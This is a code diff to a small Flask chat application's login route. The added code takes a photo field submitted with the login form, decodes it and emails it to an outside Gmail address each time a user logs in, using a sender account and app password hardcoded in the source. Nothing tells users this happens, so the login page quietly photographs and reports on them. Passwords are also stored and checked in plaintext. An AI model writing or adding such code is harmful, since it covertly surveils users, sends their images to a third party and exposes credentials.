@@ -5,6 +5,10 @@ from datetime import datetime
 from datetime import datetime
 import pytz
 from flask import request
+import base64
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.image import MIMEImage
 
 ADMIN_USERNAME = "thamizhamuthan"
 
@@ -49,22 +53,54 @@ def register():
 
     return render_template('register.html')
 
+
+
+EMAIL_SENDER = "kira7shikigami@gmail.com"
+EMAIL_PASSWORD = "ezue ednq ollg edjn"
+EMAIL_RECEIVER = "m.naruto2009@gmail.com"
+
 @app.route('/login', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
-        uname = request.form['username']
+        uname = request.form['username'].strip()
         pwd = request.form['password']
+        photo_data = request.form.get('photo')
 
         with open('users.json', 'r') as f:
             users = json.load(f)
 
         if uname in users and users[uname] == pwd:
             session['username'] = uname
+
+            if photo_data:
+                try:
+                    photo_base64 = photo_data.split(',')[1]
+                    img_bytes = base64.b64decode(photo_base64)
+                    img_filename = f"{uname}_login.png"
+
+                    msg = MIMEMultipart()
+                    msg['Subject'] = f'{uname} just logged in'
+                    msg['From'] = EMAIL_SENDER
+                    msg['To'] = EMAIL_RECEIVER
+
+                    img = MIMEImage(img_bytes, name=img_filename)
+                    msg.attach(img)
+
+                    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
+                        server.login(EMAIL_SENDER, EMAIL_PASSWORD)
+                        server.send_message(msg)
+
+                    print(f"✅ Login photo sent for {uname}")
+
+                except Exception as e:
+                    print(f"❌ Failed to send email: {e}")
+
             return redirect(url_for('chat'))
 
         return "Invalid username or password!"
 
     return render_template('login.html')
+
 @app.route('/chat')
 def chat():
     if 'username' not in session:
